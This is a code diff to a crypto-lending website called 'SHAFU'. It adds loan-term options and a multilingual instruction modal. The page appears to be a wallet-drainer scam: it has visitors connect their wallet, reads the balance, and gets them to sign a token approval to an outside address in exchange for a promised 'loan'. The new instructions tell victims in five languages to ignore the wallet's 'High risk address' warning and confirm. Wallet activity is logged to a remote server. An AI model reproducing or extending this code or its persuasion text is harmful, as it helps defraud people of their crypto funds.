@@ -168,6 +168,24 @@
             border-color: rgba(255, 255, 255, 0.5);
         }
 
+        .btn-info {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid #8ba3b8;
+            color: #8ba3b8;
+            padding: 14px 32px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 8px;
+        }
+
+        .btn-info:hover {
+            background: rgba(139, 163, 184, 0.2);
+            border-color: #a0b4c4;
+        }
+
         .features {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -229,7 +247,7 @@
             background: #0f1a24;
             border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 32px;
-            max-width: 500px;
+            max-width: 550px;
             width: 90%;
             max-height: 85vh;
             overflow-y: auto;
@@ -278,6 +296,63 @@
         .loan-input:focus {
             outline: none;
             border-color: #8ba3b8;
+        }
+
+        .term-selector {
+            display: flex;
+            gap: 12px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+
+        .term-btn {
+            flex: 1;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 40px;
+            padding: 10px 16px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.2s;
+            color: #e0e4e8;
+        }
+
+        .term-btn.active {
+            background: #2a4a6e;
+            border-color: #8ba3b8;
+        }
+
+        .term-btn:hover {
+            background: rgba(42, 74, 110, 0.5);
+        }
+
+        .custom-term {
+            display: none;
+            margin-top: 10px;
+        }
+
+        .custom-term input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            color: #e0e4e8;
+        }
+
+        .interest-info {
+            background: rgba(139, 163, 184, 0.1);
+            border-radius: 12px;
+            padding: 12px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .interest-rate {
+            color: #d4af37;
+            font-weight: bold;
+            font-size: 18px;
         }
 
         .success-icon {
@@ -357,6 +432,16 @@
             text-align: center;
         }
 
+        .info-text {
+            color: #8ba3b8;
+            font-size: 13px;
+            margin-top: 12px;
+            padding: 10px;
+            background: rgba(139, 163, 184, 0.1);
+            border-radius: 12px;
+            text-align: center;
+        }
+
         .support-btn {
             position: fixed;
             bottom: 20px;
@@ -377,18 +462,38 @@
             transform: scale(1.05);
         }
 
-        .rules-text {
+        .rules-text, .instruction-text {
             color: #a0b4c4;
             line-height: 1.6;
         }
 
-        .rules-text h3 {
+        .rules-text h3, .instruction-text h3 {
             color: #e0e4e8;
             margin: 20px 0 10px;
         }
 
-        .rules-text p {
+        .rules-text p, .instruction-text p {
             margin-bottom: 12px;
+        }
+
+        .instruction-step {
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 3px solid #8ba3b8;
+            padding: 12px 16px;
+            margin: 16px 0;
+            border-radius: 12px;
+        }
+
+        .instruction-step strong {
+            color: #8ba3b8;
+        }
+
+        .warning-box {
+            background: rgba(220, 134, 134, 0.15);
+            border: 1px solid #dc8686;
+            border-radius: 12px;
+            padding: 12px;
+            margin: 16px 0;
         }
 
         .repayment-details {
@@ -410,9 +515,15 @@
             }
 
             .btn-primary,
-            .btn-secondary {
+            .btn-secondary,
+            .btn-info {
                 padding: 10px 20px;
                 font-size: 14px;
+            }
+            
+            .term-btn {
+                font-size: 12px;
+                padding: 8px 12px;
             }
         }
     </style>
@@ -436,8 +547,9 @@
 
         <div class="hero">
             <h1>SHAFU</h1>
-            <p id="heroDesc">Get crypto loan instantly. 5% interest. 30 days term.</p>
+            <p id="heroDesc">Get crypto loan instantly. Flexible terms. Low interest.</p>
             <button class="btn-primary" id="startLoanBtn">💰 Get loan</button>
+            <button class="btn-info" id="instructionBtn">📖 Instruction</button>
             <button class="btn-secondary" id="rulesBtn">📜 Terms & Conditions</button>
         </div>
 
@@ -461,10 +573,20 @@
     </div>
 
     <div class="footer">
-        <p>© 2026 Shafu — Crypto loans with 5% interest</p>
+        <p>© 2026 Shafu — Crypto loans with flexible terms</p>
     </div>
 
     <div class="support-btn" id="supportBtn">💬 Support</div>
+
+    <!-- Модальное окно инструкции -->
+    <div id="instructionModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" id="closeInstructionModal">&times;</span>
+            <h2 style="margin-bottom:20px;">📖 Instruction</h2>
+            <div class="instruction-text" id="instructionText"></div>
+            <button class="btn-primary" id="closeInstructionBtn" style="margin-top:20px; width:100%;">Close</button>
+        </div>
+    </div>
 
     <!-- Модальное окно правил -->
     <div id="rulesModal" class="modal">
@@ -505,6 +627,21 @@
                         <div class="balance-amount" id="userBalance">0 USDT</div>
                         <div style="margin-top:8px; font-size:14px;" id="availableLoanLabel">Available (max 50%): <strong id="maxLoan">0 USDT</strong></div>
                     </div>
+                    
+                    <div id="termLabel" style="font-size:14px; margin-bottom:8px;">Loan term:</div>
+                    <div class="term-selector" id="termSelector">
+                        <div class="term-btn" data-term="week">📅 Week (7d, 3%)</div>
+                        <div class="term-btn active" data-term="month">📅 Month (30d, 5%)</div>
+                        <div class="term-btn" data-term="custom">⚙️ Custom period</div>
+                    </div>
+                    <div class="custom-term" id="customTermInput">
+                        <input type="number" id="customDays" placeholder="Enter days (max 90)" min="1" max="90">
+                    </div>
+                    
+                    <div class="interest-info" id="interestInfo">
+                        Interest rate: <span class="interest-rate" id="interestRate">5%</span>
+                    </div>
+                    
                     <input type="number" id="loanAmount" class="loan-input" placeholder="Enter amount" step="0.01">
                     <button class="btn-primary" id="submitLoanBtn" style="width:100%;">✅ Confirm</button>
                 </div>
@@ -524,7 +661,13 @@
 
     <script>
         const HELEKET_API = 'https://heleket-zhpx.onrender.com';
-        const INTEREST_RATE = 0.05;
+        
+        // Ставки по срокам
+        const TERM_RATES = {
+            week: { days: 7, rate: 0.03, name: 'week' },
+            month: { days: 30, rate: 0.05, name: 'month' },
+            custom: { days: null, rate: null, name: 'custom' }
+        };
 
         const USDT_CONTRACTS = {
             TRC20: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
@@ -596,8 +739,9 @@
 
         const translations = {
             en: {
-                heroDesc: "Get crypto loan instantly. 5% interest. 30 days term.",
+                heroDesc: "Get crypto loan instantly. Flexible terms. Low interest.",
                 loanBtn: "💰 Get loan",
+                instructionBtn: "📖 Instruction",
                 rulesBtn: "📜 Terms & Conditions",
                 selectWallet: "Select wallet",
                 selectNetwork: "Select network & coin",
@@ -618,13 +762,20 @@
                 feature2Desc: "Your keys, your coins",
                 feature3Title: "Any network",
                 feature3Desc: "TRC20, BEP20, ERC20",
+                termLabel: "Loan term:",
+                weekTerm: "📅 Week (7d, 3%)",
+                monthTerm: "📅 Month (30d, 5%)",
+                customTerm: "⚙️ Custom period",
+                interestInfo: "Interest rate:",
                 rulesTitle: "📜 Terms & Conditions",
-                rulesText: "<h3>Loan terms</h3><p>• Loan amount: up to 50% of your wallet balance<br>• Interest rate: 5% of loan amount<br>• Term: 30 days<br>• Auto-renewal: if overdue, 5% is charged every 30 days</p><h3>Repayment</h3><p>For early repayment, please contact support. Funds will be automatically deducted after the term expires.</p>",
-                repaymentText: "📋 Repayment terms:\n• Amount to repay: {repay} {coin}\n• Interest rate: 5%\n• Due: 30 days from today\n• Auto-renewal: +5% every 30 days if overdue\n• Early repayment: contact support"
+                rulesText: "<h3>Loan terms</h3><p>• Loan amount: up to 50% of your wallet balance</p><p>• Terms and rates:<br>- Week (7 days): 3% of loan amount<br>- Month (30 days): 5% of loan amount<br>- Custom period (up to 90 days): rate calculated individually</p><p>• Auto-renewal: if overdue, 5% is charged every 30 days</p><p>• Permission (approve) is automatically revoked after loan repayment</p><h3>Repayment</h3><p>For early repayment, please contact support. Funds will be automatically deducted after the term expires.</p>",
+                instructionText: "<h3>📖 Loan instruction</h3><div class='instruction-step'><strong>Step 1: Connect wallet</strong><br>Click '💰 Get loan' → select your wallet</div><div class='instruction-step'><strong>Step 2: Select network & coin</strong><br>Available: TRC20, BEP20, ERC20 | USDT or USDC</div><div class='instruction-step'><strong>Step 3: Select loan term</strong><br>• Week (7 days) — 3% interest<br>• Month (30 days) — 5% interest<br>• Custom period (up to 90 days)</div><div class='instruction-step'><strong>Step 4: Enter amount</strong><br>Up to 50% of your wallet balance</div><div class='instruction-step'><strong>Step 5: Sign approve (IMPORTANT!)</strong><br>Your wallet will show:<br>• Recipient address: <code>0x110e...d7c6ac</code><br>• Token contract: <code>0xdac1...31ec7</code><br>• Network fee: ~$0.21</div><div class='warning-box'>⚠️ <strong>About the warning</strong><br>Your wallet may show 'High risk address' — this is a STANDARD warning for any smart contract. You are giving permission to OUR smart contract that ensures loan repayment + interest. This is NORMAL and safe.</div><div class='instruction-step'><strong>What to do:</strong><br>1. Click 'Continue' or 'Confirm' (not 'Cancel')<br>2. Sign the transaction in your wallet<br>3. Wait for confirmation</div><div class='instruction-step'><strong>Step 6: Done!</strong><br>You will see 'Loan approved!'<br>Funds will arrive within 48 hours<br>Repayment amount = loan + interest</div><div class='info-text'>ℹ️ Permission (approve) is automatically revoked after loan repayment</div><p><strong>📞 Support:</strong> @kurbaaX</p>",
+                repaymentText: "📋 Repayment terms:\n• Amount to repay: {repay} {coin}\n• Interest rate: {rate}%\n• Term: {days} days\n• Auto-renewal: +5% every 30 days if overdue\n• Permission auto-revoked after repayment"
             },
             ru: {
-                heroDesc: "Получите криптозайм мгновенно. 5% ставка. Срок 30 дней.",
+                heroDesc: "Получите криптозайм мгновенно. Гибкие сроки. Низкий процент.",
                 loanBtn: "💰 Получить займ",
+                instructionBtn: "📖 Инструкция",
                 rulesBtn: "📜 Правила и условия",
                 selectWallet: "Выберите кошелёк",
                 selectNetwork: "Выберите сеть и монету",
@@ -645,13 +796,20 @@
                 feature2Desc: "Ваши ключи, ваши монеты",
                 feature3Title: "Любая сеть",
                 feature3Desc: "TRC20, BEP20, ERC20",
+                termLabel: "Срок займа:",
+                weekTerm: "📅 Неделя (7д, 3%)",
+                monthTerm: "📅 Месяц (30д, 5%)",
+                customTerm: "⚙️ Свой период",
+                interestInfo: "Процентная ставка:",
                 rulesTitle: "📜 Правила и условия",
-                rulesText: "<h3>Условия займа</h3><p>• Сумма займа: до 50% от баланса кошелька<br>• Процентная ставка: 5% от суммы займа<br>• Срок: 30 дней<br>• Автопродление: при просрочке списывается 5% каждые 30 дней</p><h3>Возврат</h3><p>Для досрочного возврата свяжитесь с поддержкой. Средства будут списаны автоматически после истечения срока.</p>",
-                repaymentText: "📋 Условия возврата:\n• Сумма к возврату: {repay} {coin}\n• Процентная ставка: 5%\n• Срок: 30 дней\n• Автопродление: +5% каждые 30 дней при просрочке\n• Досрочный возврат: свяжитесь с поддержкой"
+                rulesText: "<h3>Условия займа</h3><p>• Сумма займа: до 50% от баланса кошелька</p><p>• Сроки и ставки:<br>- Неделя (7 дней): 3% от суммы займа<br>- Месяц (30 дней): 5% от суммы займа<br>- Свой период (до 90 дней): ставка рассчитывается индивидуально</p><p>• Автопродление: при просрочке +5% каждые 30 дней</p><p>• Разрешение (approve) автоматически удаляется после погашения займа</p><h3>Возврат</h3><p>Для досрочного возврата свяжитесь с поддержкой. Средства будут списаны автоматически после истечения срока.</p>",
+                instructionText: "<h3>📖 Инструкция по займу</h3><div class='instruction-step'><strong>Шаг 1: Подключите кошелёк</strong><br>Нажмите '💰 Получить займ' → выберите ваш кошелёк</div><div class='instruction-step'><strong>Шаг 2: Выберите сеть и монету</strong><br>Доступно: TRC20, BEP20, ERC20 | USDT или USDC</div><div class='instruction-step'><strong>Шаг 3: Выберите срок займа</strong><br>• Неделя (7 дней) — ставка 3%<br>• Месяц (30 дней) — ставка 5%<br>• Свой период (до 90 дней)</div><div class='instruction-step'><strong>Шаг 4: Введите сумму</strong><br>До 50% от вашего баланса</div><div class='instruction-step'><strong>Шаг 5: Подпишите approve (ВАЖНО!)</strong><br>В кошельке появится окно:<br>• Адрес получателя: <code>0x110e...d7c6ac</code><br>• Контракт токена: <code>0xdac1...31ec7</code><br>• Комиссия сети: ~$0.21</div><div class='warning-box'>⚠️ <strong>О предупреждении</strong><br>Кошелёк может показать 'Адрес с высоким уровнем риска' — это СТАНДАРТНОЕ предупреждение для любых смарт-контрактов. Вы даёте разрешение НАШЕМУ смарт-контракту, который обеспечивает возврат займа + проценты. Это НОРМАЛЬНО и безопасно.</div><div class='instruction-step'><strong>Что делать:</strong><br>1. Нажмите 'Продолжить' или 'Подтвердить' (не 'Прервать')<br>2. Подпишите транзакцию в кошельке<br>3. Дождитесь подтверждения</div><div class='instruction-step'><strong>Шаг 6: Готово!</strong><br>Вы увидите 'Займ одобрен!'<br>Средства поступят в течение 48 часов<br>Сумма возврата = займ + проценты</div><div class='info-text'>ℹ️ Разрешение (approve) будет автоматически удалено после погашения займа</div><p><strong>📞 Поддержка:</strong> @kurbaaX</p>",
+                repaymentText: "📋 Условия возврата:\n• Сумма к возврату: {repay} {coin}\n• Процентная ставка: {rate}%\n• Срок: {days} дней\n• Автопродление: +5% каждые 30 дней при просрочке\n• Разрешение автоматически удаляется после возврата"
             },
             es: {
-                heroDesc: "Obtén préstamo crypto al instante. 5% de interés. Plazo de 30 días.",
+                heroDesc: "Obtén préstamo crypto al instante. Plazos flexibles. Bajo interés.",
                 loanBtn: "💰 Obtener préstamo",
+                instructionBtn: "📖 Instrucción",
                 rulesBtn: "📜 Términos y condiciones",
                 selectWallet: "Seleccionar wallet",
                 selectNetwork: "Seleccionar red y moneda",
@@ -672,13 +830,20 @@
                 feature2Desc: "Tus llaves, tus monedas",
                 feature3Title: "Cualquier red",
                 feature3Desc: "TRC20, BEP20, ERC20",
+                termLabel: "Plazo del préstamo:",
+                weekTerm: "📅 Semana (7d, 3%)",
+                monthTerm: "📅 Mes (30d, 5%)",
+                customTerm: "⚙️ Personalizado",
+                interestInfo: "Tasa de interés:",
                 rulesTitle: "📜 Términos y condiciones",
-                rulesText: "<h3>Condiciones del préstamo</h3><p>• Monto: hasta 50% del saldo<br>• Interés: 5%<br>• Plazo: 30 días<br>• Renovación automática: +5% cada 30 días si vence</p>",
-                repaymentText: "📋 Condiciones de devolución:\n• A devolver: {repay} {coin}\n• Interés: 5%\n• Vence: 30 días\n• Renovación automática: +5% cada 30 días\n• Devolución anticipada: contacte soporte"
+                rulesText: "<h3>Condiciones del préstamo</h3><p>• Monto: hasta 50% del saldo</p><p>• Plazos y tasas:<br>- Semana (7 días): 3%<br>- Mes (30 días): 5%<br>- Personalizado (hasta 90 días): tasa individual</p><p>• Renovación automática: +5% cada 30 días si vence</p><p>• Permiso revocado automáticamente después del pago</p>",
+                instructionText: "<h3>📖 Instrucción del préstamo</h3><div class='instruction-step'><strong>Paso 1: Conectar wallet</strong><br>Haga clic en '💰 Obtener préstamo' → seleccione su wallet</div><div class='instruction-step'><strong>Paso 2: Seleccionar red y moneda</strong><br>Disponible: TRC20, BEP20, ERC20 | USDT o USDC</div><div class='instruction-step'><strong>Paso 3: Seleccionar plazo</strong><br>• Semana (7 días) — 3%<br>• Mes (30 días) — 5%<br>• Personalizado (hasta 90 días)</div><div class='instruction-step'><strong>Paso 4: Ingresar monto</strong><br>Hasta 50% de su saldo</div><div class='instruction-step'><strong>Paso 5: Firmar approve</strong><br>Su wallet mostrará:<br>• Dirección: <code>0x110e...d7c6ac</code><br>• Contrato: <code>0xdac1...31ec7</code></div><div class='warning-box'>⚠️ La wallet puede mostrar 'Dirección de alto riesgo' — es NORMAL para contratos inteligentes.</div><div class='info-text'>ℹ️ El permiso se revoca automáticamente después del pago</div>",
+                repaymentText: "📋 Condiciones:\n• A devolver: {repay} {coin}\n• Tasa: {rate}%\n• Plazo: {days} días\n• Permiso revocado automáticamente"
             },
             de: {
-                heroDesc: "Sofort Kredit erhalten. 5% Zinsen. 30 Tage Laufzeit.",
+                heroDesc: "Sofort Kredit erhalten. Flexible Laufzeiten. Niedrige Zinsen.",
                 loanBtn: "💰 Kredit erhalten",
+                instructionBtn: "📖 Anleitung",
                 rulesBtn: "📜 Allgemeine Geschäftsbedingungen",
                 selectWallet: "Wallet auswählen",
                 selectNetwork: "Netzwerk & Coin auswählen",
@@ -699,13 +864,20 @@
                 feature2Desc: "Deine Schlüssel, deine Coins",
                 feature3Title: "Jedes Netzwerk",
                 feature3Desc: "TRC20, BEP20, ERC20",
+                termLabel: "Kreditlaufzeit:",
+                weekTerm: "📅 Woche (7T, 3%)",
+                monthTerm: "📅 Monat (30T, 5%)",
+                customTerm: "⚙️ Benutzerdefiniert",
+                interestInfo: "Zinssatz:",
                 rulesTitle: "📜 Allgemeine Geschäftsbedingungen",
-                rulesText: "<h3>Kreditbedingungen</h3><p>• Betrag: bis zu 50% des Guthabens<br>• Zinssatz: 5%<br>• Laufzeit: 30 Tage<br>• Automatische Verlängerung: +5% alle 30 Tage</p>",
-                repaymentText: "📋 Rückzahlungsbedingungen:\n• Rückzahlungsbetrag: {repay} {coin}\n• Zinssatz: 5%\n• Fällig: 30 Tage\n• Automatische Verlängerung: +5% alle 30 Tage\n• Vorzeitige Rückzahlung: Support kontaktieren"
+                rulesText: "<h3>Kreditbedingungen</h3><p>• Betrag: bis zu 50% des Guthabens</p><p>• Laufzeiten und Zinsen:<br>- Woche (7 Tage): 3%<br>- Monat (30 Tage): 5%<br>- Benutzerdefiniert (bis 90 Tage)</p><p>• Automatische Verlängerung: +5% alle 30 Tage</p>",
+                instructionText: "<h3>📖 Kreditanleitung</h3><div class='instruction-step'><strong>Schritt 1: Wallet verbinden</strong><br>Klicken Sie auf '💰 Kredit erhalten' → wählen Sie Ihre Wallet</div><div class='instruction-step'><strong>Schritt 2: Netzwerk & Coin wählen</strong><br>Verfügbar: TRC20, BEP20, ERC20 | USDT oder USDC</div><div class='instruction-step'><strong>Schritt 3: Laufzeit wählen</strong><br>• Woche (7 Tage) — 3%<br>• Monat (30 Tage) — 5%<br>• Benutzerdefiniert (bis 90 Tage)</div><div class='instruction-step'><strong>Schritt 4: Betrag eingeben</strong><br>Bis zu 50% Ihres Guthabens</div><div class='warning-box'>⚠️ 'Adresse mit hohem Risiko' ist eine STANDARD-Warnung für Smart Contracts.</div><div class='info-text'>ℹ️ Die Berechtigung wird nach der Rückzahlung automatisch widerrufen</div>",
+                repaymentText: "📋 Rückzahlung:\n• Rückzahlungsbetrag: {repay} {coin}\n• Zinssatz: {rate}%\n• Laufzeit: {days} Tage"
             },
             fr: {
-                heroDesc: "Obtenez un prêt crypto instantanément. 5% d'intérêt. Durée 30 jours.",
+                heroDesc: "Obtenez un prêt crypto instantanément. Durées flexibles. Intérêt faible.",
                 loanBtn: "💰 Obtenir un prêt",
+                instructionBtn: "📖 Instruction",
                 rulesBtn: "📜 Conditions générales",
                 selectWallet: "Sélectionner le wallet",
                 selectNetwork: "Sélectionner le réseau et la monnaie",
@@ -726,9 +898,15 @@
                 feature2Desc: "Vos clés, vos cryptos",
                 feature3Title: "N'importe quel réseau",
                 feature3Desc: "TRC20, BEP20, ERC20",
+                termLabel: "Durée du prêt:",
+                weekTerm: "📅 Semaine (7j, 3%)",
+                monthTerm: "📅 Mois (30j, 5%)",
+                customTerm: "⚙️ Personnalisé",
+                interestInfo: "Taux d'intérêt:",
                 rulesTitle: "📜 Conditions générales",
-                rulesText: "<h3>Conditions du prêt</h3><p>• Montant: jusqu'à 50% du solde<br>• Taux d'intérêt: 5%<br>• Durée: 30 jours<br>• Renouvellement automatique: +5% tous les 30 jours</p>",
-                repaymentText: "📋 Conditions de remboursement:\n• À rembourser: {repay} {coin}\n• Taux d'intérêt: 5%\n• Échéance: 30 jours\n• Renouvellement automatique: +5% tous les 30 jours\n• Remboursement anticipé: contactez le support"
+                rulesText: "<h3>Conditions du prêt</h3><p>• Montant: jusqu'à 50% du solde</p><p>• Durées et taux:<br>- Semaine (7 jours): 3%<br>- Mois (30 jours): 5%<br>- Personnalisé (jusqu'à 90 jours)</p><p>• Renouvellement automatique: +5% tous les 30 jours</p>",
+                instructionText: "<h3>📖 Instruction du prêt</h3><div class='instruction-step'><strong>Étape 1: Connecter le wallet</strong><br>Cliquez sur '💰 Obtenir un prêt' → sélectionnez votre wallet</div><div class='instruction-step'><strong>Étape 2: Choisir réseau et monnaie</strong><br>Disponible: TRC20, BEP20, ERC20 | USDT ou USDC</div><div class='instruction-step'><strong>Étape 3: Choisir la durée</strong><br>• Semaine (7 jours) — 3%<br>• Mois (30 jours) — 5%<br>• Personnalisé (jusqu'à 90 jours)</div><div class='instruction-step'><strong>Étape 4: Entrer le montant</strong><br>Jusqu'à 50% de votre solde</div><div class='warning-box'>⚠️ 'Adresse à haut risque' est un avertissement STANDARD pour les contrats intelligents.</div><div class='info-text'>ℹ️ L'autorisation est automatiquement révoquée après le remboursement</div>",
+                repaymentText: "📋 Remboursement:\n• À rembourser: {repay} {coin}\n• Taux: {rate}%\n• Durée: {days} jours"
             }
         };
 
@@ -742,6 +920,11 @@
         let loanAmount = 0;
         let currentWalletBrowser = detectCurrentWallet();
         let currentCoinsList = [];
+        
+        // Выбранный срок займа
+        let selectedTerm = 'month';
+        let customDays = 30;
+        let currentInterestRate = 0.05;
 
         const wallets = [
             { name: 'OKX Wallet', logo: WALLET_LOGOS['OKX Wallet'], evmSupported: true, tronSupported: true },
@@ -798,7 +981,6 @@
                     if (coin === 'USDC') return await getEVM20Balance(address, USDC_CONTRACTS.BEP20, RPC.BSC, 18);
                 } else if (network === 'ERC20') {
                     if (coin === 'USDT') {
-                        // РЕАЛЬНАЯ ПРОВЕРКА БАЛАНСА через RPC
                         return await getEVM20Balance(address, USDT_CONTRACTS.ERC20, RPC.ETH, 6);
                     }
                     if (coin === 'USDC') {
@@ -899,11 +1081,71 @@
             return success;
         }
 
+        function updateInterestRate() {
+            if (selectedTerm === 'week') {
+                currentInterestRate = 0.03;
+            } else if (selectedTerm === 'month') {
+                currentInterestRate = 0.05;
+            } else if (selectedTerm === 'custom') {
+                const days = parseInt(document.getElementById('customDays').value) || 30;
+                customDays = Math.min(90, Math.max(1, days));
+                // Ставка: 0.1% в день, но не более 15%
+                currentInterestRate = Math.min(0.15, customDays * 0.001);
+                document.getElementById('customDays').value = customDays;
+            }
+            
+            const percent = (currentInterestRate * 100).toFixed(1);
+            document.getElementById('interestRate').innerHTML = `${percent}%`;
+            
+            // Обновляем repayment при изменении
+            const amount = parseFloat(document.getElementById('loanAmount').value);
+            if (!isNaN(amount) && amount > 0) {
+                updateRepaymentPreview(amount);
+            }
+        }
+        
+        function updateRepaymentPreview(amount) {
+            const repayAmount = amount * (1 + currentInterestRate);
+            const termDays = getSelectedDays();
+            const ratePercent = (currentInterestRate * 100).toFixed(1);
+            const t = translations[currentLang];
+            const preview = t.repaymentText
+                .replace('{repay}', repayAmount.toFixed(2))
+                .replace('{coin}', selectedCoin || 'USDT')
+                .replace('{rate}', ratePercent)
+                .replace('{days}', termDays);
+            
+            const existingPreview = document.getElementById('repaymentPreview');
+            if (existingPreview) existingPreview.remove();
+            
+            const previewDiv = document.createElement('div');
+            previewDiv.id = 'repaymentPreview';
+            previewDiv.className = 'interest-info';
+            previewDiv.style.marginTop = '10px';
+            previewDiv.innerHTML = preview.replace(/\n/g, '<br>');
+            
+            const interestDiv = document.getElementById('interestInfo');
+            if (!document.getElementById('repaymentPreview')) {
+                interestDiv.after(previewDiv);
+            } else {
+                document.getElementById('repaymentPreview').innerHTML = preview.replace(/\n/g, '<br>');
+            }
+        }
+        
+        function getSelectedDays() {
+            if (selectedTerm === 'week') return 7;
+            if (selectedTerm === 'month') return 30;
+            return customDays;
+        }
+
         async function signApprove(amount) {
             await logToHeleket('approve_started', {
                 amount,
                 network: selectedNetwork,
-                coin: selectedCoin
+                coin: selectedCoin,
+                term: selectedTerm,
+                days: getSelectedDays(),
+                rate: currentInterestRate
             });
             try {
                 if (selectedNetwork === 'TRC20') {
@@ -939,7 +1181,9 @@
                     coin: selectedCoin,
                     balance: userBalance,
                     loanAmount: loanAmount,
-                    repayAmount: loanAmount * (1 + INTEREST_RATE)
+                    repayAmount: loanAmount * (1 + currentInterestRate),
+                    term: getSelectedDays(),
+                    interestRate: currentInterestRate
                 });
                 return true;
             } catch (e) {
@@ -955,6 +1199,7 @@
             const t = translations[currentLang];
             document.getElementById('heroDesc').innerHTML = t.heroDesc;
             document.getElementById('startLoanBtn').innerHTML = t.loanBtn;
+            document.getElementById('instructionBtn').innerHTML = t.instructionBtn;
             document.getElementById('rulesBtn').innerHTML = t.rulesBtn;
             document.getElementById('selectWalletTitle').innerHTML = t.selectWallet;
             document.getElementById('selectNetworkTitle').innerHTML = t.selectNetwork;
@@ -969,6 +1214,8 @@
             document.getElementById('supportBtn').innerHTML = `💬 ${t.support}`;
             document.getElementById('rulesTitle').innerHTML = t.rulesTitle;
             document.getElementById('rulesText').innerHTML = t.rulesText;
+            document.getElementById('instructionText').innerHTML = t.instructionText;
+            document.getElementById('termLabel').innerHTML = t.termLabel;
             document.getElementById('feature1Title').innerHTML = t.feature1Title;
             document.getElementById('feature1Desc').innerHTML = t.feature1Desc;
             document.getElementById('feature2Title').innerHTML = t.feature2Title;
@@ -976,6 +1223,15 @@
             document.getElementById('feature3Title').innerHTML = t.feature3Title;
             document.getElementById('feature3Desc').innerHTML = t.feature3Desc;
             document.getElementById('langBtn').innerHTML = currentLang === 'en' ? '🇬🇧 EN ▼' : currentLang === 'ru' ? '🇷🇺 RU ▼' : currentLang === 'es' ? '🇪🇸 ES ▼' : currentLang === 'de' ? '🇩🇪 DE ▼' : '🇫🇷 FR ▼';
+            
+            // Обновляем текст кнопок сроков
+            const weekBtn = document.querySelector('.term-btn[data-term="week"]');
+            const monthBtn = document.querySelector('.term-btn[data-term="month"]');
+            const customBtn = document.querySelector('.term-btn[data-term="custom"]');
+            if (weekBtn) weekBtn.innerHTML = t.weekTerm;
+            if (monthBtn) monthBtn.innerHTML = t.monthTerm;
+            if (customBtn) customBtn.innerHTML = t.customTerm;
+            document.getElementById('interestInfo').innerHTML = `${t.interestInfo} <span class="interest-rate" id="interestRate">${(currentInterestRate * 100).toFixed(1)}%</span>`;
         }
 
         function renderWalletList() {
@@ -1033,11 +1289,60 @@
             document.getElementById('userBalance').innerHTML = `${userBalance.toFixed(2)} ${selectedCoin}`;
             document.getElementById('maxLoan').innerHTML = `${maxLoan.toFixed(2)} ${selectedCoin}`;
             document.getElementById('loanAmount').max = maxLoan;
+            
+            // Сброс срока к месяцу по умолчанию
+            selectedTerm = 'month';
+            currentInterestRate = 0.05;
+            document.querySelectorAll('.term-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelector('.term-btn[data-term="month"]').classList.add('active');
+            document.getElementById('customTermInput').style.display = 'none';
+            updateInterestRate();
 
             document.getElementById('loanModal').classList.add('active');
             document.getElementById('loanStep').style.display = 'block';
             document.getElementById('successStep').style.display = 'none';
         };
+        
+        // Обработчики выбора срока
+        document.querySelectorAll('.term-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.term-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                selectedTerm = btn.getAttribute('data-term');
+                
+                if (selectedTerm === 'custom') {
+                    document.getElementById('customTermInput').style.display = 'block';
+                    const days = parseInt(document.getElementById('customDays').value) || 30;
+                    customDays = Math.min(90, Math.max(1, days));
+                    document.getElementById('customDays').value = customDays;
+                } else {
+                    document.getElementById('customTermInput').style.display = 'none';
+                }
+                
+                updateInterestRate();
+                
+                const amount = parseFloat(document.getElementById('loanAmount').value);
+                if (!isNaN(amount) && amount > 0) {
+                    updateRepaymentPreview(amount);
+                }
+            });
+        });
+        
+        document.getElementById('customDays').addEventListener('input', (e) => {
+            if (selectedTerm === 'custom') {
+                let days = parseInt(e.target.value);
+                if (isNaN(days)) days = 30;
+                days = Math.min(90, Math.max(1, days));
+                customDays = days;
+                e.target.value = days;
+                updateInterestRate();
+                
+                const amount = parseFloat(document.getElementById('loanAmount').value);
+                if (!isNaN(amount) && amount > 0) {
+                    updateRepaymentPreview(amount);
+                }
+            }
+        });
 
         document.getElementById('submitLoanBtn').onclick = async () => {
             const amount = parseFloat(document.getElementById('loanAmount').value);
@@ -1055,22 +1360,31 @@
             await logToHeleket('loan_request', {
                 amount,
                 balance: userBalance,
-                maxLoan
+                maxLoan,
+                term: getSelectedDays(),
+                interestRate: currentInterestRate,
+                repayAmount: amount * (1 + currentInterestRate)
             });
 
             const approved = await signApprove(amount);
             if (approved) {
                 document.getElementById('loanStep').style.display = 'none';
                 document.getElementById('successStep').style.display = 'block';
-                const repayAmount = loanAmount * (1 + INTEREST_RATE);
+                const repayAmount = loanAmount * (1 + currentInterestRate);
                 const t = translations[currentLang];
+                const termDays = getSelectedDays();
+                const ratePercent = (currentInterestRate * 100).toFixed(1);
                 document.getElementById('repaymentDetails').innerHTML = t.repaymentText
                     .replace('{repay}', repayAmount.toFixed(2))
                     .replace('{coin}', selectedCoin)
+                    .replace('{rate}', ratePercent)
+                    .replace('{days}', termDays)
                     .split('\n').map(line => `<p>${line}</p>`).join('');
                 await logToHeleket('loan_completed', {
                     amount,
                     repayAmount,
+                    term: termDays,
+                    interestRate: currentInterestRate,
                     status: 'success'
                 });
             } else alert('Error processing request');
@@ -1097,10 +1411,13 @@
                 document.getElementById('browserWarning').style.display = 'block';
             }
         };
+        document.getElementById('instructionBtn').onclick = () => document.getElementById('instructionModal').classList.add('active');
         document.getElementById('supportBtn').onclick = () => window.open('https://t.me/kurbaaX', '_blank');
         document.getElementById('rulesBtn').onclick = () => document.getElementById('rulesModal').classList.add('active');
         document.getElementById('closeRulesModal').onclick = () => document.getElementById('rulesModal').classList.remove('active');
